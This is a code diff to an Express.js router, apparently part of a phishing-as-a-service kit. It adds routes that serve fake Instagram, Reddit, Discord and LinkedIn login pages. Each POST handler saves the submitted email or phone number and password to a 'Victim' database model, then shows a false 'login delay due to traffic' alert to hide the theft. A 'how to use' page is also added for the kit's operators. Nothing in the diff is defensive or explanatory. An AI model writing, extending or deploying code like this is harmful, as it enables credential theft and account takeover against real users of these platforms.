@@ -69,6 +69,11 @@ router.get('/dashboard', async (req, res) => {
     }
 });
 
+// Render HOW TO USE page if user is logged in
+router.get('/how2use', (req, res) => {
+    res.render('how2use');
+});
+
 
 
 
@@ -173,6 +178,113 @@ router.post('/submit-tiktok-details', async (req, res) => {
         res.status(500).send('Error processing request');
     }
 });
+
+
+
+// INSTAGRAM page route
+// Route to display the Instagram login page
+router.get('/instagram', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('instagram', { userId });
+});
+
+// Route to handle Instagram form submission
+router.post('/submit-instagram-details', async (req, res) => {
+    const { userId, emailOrNumber, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Instagram' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving Instagram victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
+
+
+
+
+// REDDIT ROUTE
+// Route to display the Reddit login page
+router.get('/reddit', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('reddit', { userId });
+});
+
+// Route to handle Reddit form submission
+router.post('/submit-reddit-details', async (req, res) => {
+    const { userId, emailOrNumber, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Reddit' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving Reddit victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
+
+
+
+
+
+// DISCORD ROUTE
+// Route to display the Discord login page
+router.get('/discord', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('discord', { userId });
+});
+
+// Route to handle Discord form submission
+router.post('/submit-discord-details', async (req, res) => {
+    const { userId, emailOrNumber, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Discord' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving Discord victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
+
+
+
+
+// Linked in ROUTE
+// Route to display the LinkedIn login page
+router.get('/linkedin', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('linkedin', { userId });
+});
+
+// Route to handle LinkedIn form submission
+router.post('/submit-linkedin-details', async (req, res) => {
+    const { userId, emailOrNumber, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber, password, platform: 'LinkedIn' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving LinkedIn victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
+
+
+
 
 
 
